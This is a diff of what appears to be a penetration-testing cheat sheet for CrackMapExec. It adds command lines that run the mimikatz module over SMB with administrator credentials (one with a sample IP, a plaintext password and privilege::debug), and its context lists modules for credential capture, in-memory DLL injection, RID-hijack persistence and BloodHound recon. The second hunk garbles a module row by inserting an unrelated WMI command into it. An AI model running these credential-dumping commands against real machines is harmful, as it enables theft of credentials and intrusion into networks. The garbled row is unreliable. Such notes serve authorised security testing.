@@ -139,7 +139,8 @@ crackmapexec smb -M mimikatz --module-info
 crackmapexec smb -M mimikatz --options  
 # Mimikatz module 
 crackmapexec smb $ip -u 'Administrator' -p 'PASS' --local-auth -M mimikatz 
-crackmapexec smb $ip -u 'Administrator' -p 'PASS' -M mimikatz crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
+crackmapexec smb $ip -u 'Administrator' -p 'PASS' -M mimikatz 
+crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
 
 [*] Get-ComputerDetails       Enumerates sysinfo 
 [*] bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers\' machine 
@@ -196,7 +197,7 @@ SMB Modules
 [*] mimikittenz               Executes Mimikittenz
 [*] multirdp                  Patches terminal services in memory to allow multiple RDP users
 [*] netripper                 Capture's credentials by using API hooking
-[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
+[*] pe_inject          Get-WmiObject -Class Win32_Share       Downloads the specified DLL/EXE and injects it into memory
 [*] rdp                       Enables/Disables RDP
 [*] rid_hijack                Executes the RID hijacking persistence hook.
 [*] runasppl                  Check if the registry value RunAsPPL is set or not
